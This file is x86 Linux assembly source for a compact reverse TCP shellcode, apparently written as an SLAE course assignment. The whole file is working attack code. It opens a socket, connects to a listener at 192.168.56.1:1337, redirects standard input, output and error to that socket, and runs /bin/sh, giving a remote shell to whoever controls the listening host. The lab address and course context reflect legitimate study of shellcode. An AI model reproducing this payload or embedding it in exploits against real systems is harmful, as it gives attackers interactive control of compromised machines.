; Shell Reverse TCP (79 bytes) Assembly
; Paw Petersen, SLAE-656
; https://www.pawpetersen.dk/slae-assignment-2-shell-reverse-tcp-linux-x86/

global _start
section text
_start: 
  ; sockfd = socket(AF_INET , SOCK_STREAM , IPPROTO_IP);
  xor   eax,eax
  push  eax               ; push IPPROTO_IP = 0 
  mov   al,0x66           ; sys_socket
  push  0x1               ; SOCK_STREAM
  mov   ebx,[esp]         ; socketcall type 1
  push  0x2               ; AF_INET
  mov   ecx,esp           ; save pointer to args in ecx
  int   0x80
  mov   esi,eax           ; store socket fd in esi

  ; struct
  ; sockaddr_in.sin_family = AF_INET;
  ; sockaddr_in.sin_port = htons( 1337 );
  ; sockaddr_in.sin_addr.s_addr = inet_addr("192.168.56.1");
  ; 
  push  dword 0x0138a8c0  ; ip 192.168.56.1
  push  word 0x3905       ; port 1337
  push  word 0x2          ; push AF_INET = 2 
  mov   ecx,esp           ; save pointer in ecx

  ; connect(sockfd,(struct sockaddr *)&server , sizeof(server));  
  mov   al,0x66           ; sys_socket
  mov   bl,0x3            ; connect
  push  0x10              ; push size of sockaddr struct
  push  ecx               ; push struct pointer
  push  esi               ; push sockfd
  mov   ecx,esp           ; save pointer to args in ecx
  int   0x80
  
  ; dup2( client_sock, 2 );
  ; dup2( client_sock, 1 );
  ; dup2( client_sock, 0 );
  xor   ecx,ecx           ; save client sockfd in ebx
  mov   cl,3              ; loop 3 times
dup_loop:
  dec   cl   
  mov   al,0x3f           ; dup2
  int   0x80
  jnz   dup_loop

  ; execve("//bin/sh",["//bin/sh"])
  mov   al,0xb            ; execve
  xor   edx,edx
  push  edx               ; push null
  push  0x68732f6e        ; hs/b
  push  0x69622f2f        ; ib//
  mov   ebx,esp           ; save pointer
  push  edx               ; push null
  push  ebx               ; push pointer
  mov   ecx,esp           ; save pointer
  int   0x80
